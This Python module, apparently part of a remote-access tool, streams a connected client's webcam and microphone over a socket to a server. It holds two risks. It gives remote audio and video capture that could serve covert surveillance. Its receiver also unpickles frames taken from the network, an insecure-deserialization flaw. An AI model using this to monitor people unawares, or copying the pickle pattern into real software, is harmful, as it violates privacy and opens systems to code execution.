#!/usr/bin/env python3

import socket
import cv2
import pickle
import wave
import numpy as np
import sys

class VideoStreamer():
    def __init__(self, user_type, sock):
        self.user_type = user_type
        self.sock = sock

    def sendVideo(self):
        if self.user_type != "client":
            print("You are not allowed to do this operation.")
            return
        
        cap = cv2.VideoCapture(cv2.CAP_ANY)
        H, W = 640, 480 #height & width set for capture

        #check for availability
        if not cap.isOpened():
            self.sock.send("OFF".encode())
            return
        self.sock.send("ON".encode()) 

        while True:
            ret, frame = cap.read()
            if not ret:
                break

            frame = cv2.resize(frame, (H, W))
            #print(frame)

            while True:
                data = self.sock.recv(1024).decode() #get operation needed

                if data == "GET":
                    self.sock.send("OK".encode())
                elif data == "GET SIZE":
                    self.sock.send(("SIZE " + str(len(pickle.dumps(frame)))).encode())
                elif data == "GET STREAM":
                    self.sock.sendall(pickle.dumps(frame))      
                elif data == "GOT":
                    break
                elif data == "EXIT":
                    print("exit")
                    cap.release()
                    return
                        
        cap.release()
    
    def receiveVideo(self):            
        if self.user_type != "server":
            print("You are not allowed to do this operation.")
            return 
            
        conn = self.sock 

        cam_status = conn.recv(1024).decode() #check webcam existence
        print("\n --- Client webcam is " + cam_status + " --- \n")

        if cam_status != "ON":
            return
        
        while True:
            conn.send("GET".encode())
            data = conn.recv(1024).decode()
            
            if data == "OK":
                conn.send("GET SIZE".encode())
                data = conn.recv(1024).decode()
                
                if data.startswith("SIZE"):
                    size = int(data.split()[1])
                    conn.send("GET STREAM".encode())

                    data = b''
                    while len(data) < size:
                        data += conn.recv(65536) #64Kb
                        if not data:
                            break

                    conn.send("GOT".encode())

            frame = pickle.loads(data)
            #print(frame)

            cv2.imshow("Client webcam", frame)

            if cv2.waitKey(1) == ord('q'):
                conn.send("EXIT".encode())
                cv2.destroyAllWindows()
                break
    
class MicStreamer():
    def __init__(self, user_type, sock):
        self.user_type = user_type
        self.sock = sock
   
    def sendMic(self):        
        try:
            import pyaudio
        except:
            print("")

        if self.user_type != "client":
            print("You are not allowed to do this operation.")
            return

        p = pyaudio.PyAudio()
        stream = p.open(format = pyaudio.paInt16, channels = 2, rate = 44100, input = True, frames_per_buffer = 1024)
        
        #start recording
        while True:               
            data = stream.read(1024)

            while True:
                response = self.sock.recv(1024).decode()
                
                if response == "GET":
                    self.sock.send("OK".encode())
                elif response == "GET SIZE":
                    self.sock.send(("SIZE: " + str(len(data))).encode())
                elif response == "GET STREAM":
                    self.sock.sendall(data)
                elif response == "GOT":
                    break
                elif response == "EXIT":
                    #stop recording
                    stream.stop_stream()
                    stream.close()
                    p.terminate()   

                    return

    def receiveMic(self):
        try:
            import pyaudio
        except:
            print("")
            
        if self.user_type != "server":
            print("You are not allowed to do this operation.")
            return

        conn = self.sock
        p = pyaudio.PyAudio()
        stream = p.open(format = pyaudio.paInt16, channels = 2, rate = 44100, output = True)
                
        print("\nListening client mic...")
        print("WARNING: Press 'Ctrl+c' to stop microphone!\n")
        try:
            while True:
                conn.send("GET".encode())
                status = conn.recv(1024).decode()

                if status == "OK":
                    conn.send("GET SIZE".encode())
                    status = conn.recv(1024).decode()

                    if status.startswith("SIZE"):
                        size = int(status.split()[1])
                        conn.send("GET STREAM".encode())

                        data = b''
                        while len(data) < size:
                            data += conn.recv(1024)
                            if not data:
                                break

                        stream.write(data)

                        conn.send("GOT".encode())
        except KeyboardInterrupt:
            print("Quitting microphone streaming...\n")

            conn.send("EXIT".encode())
                        
            #stop playing
            stream.stop_stream()
            stream.close()
            p.terminate()
                      
            pass
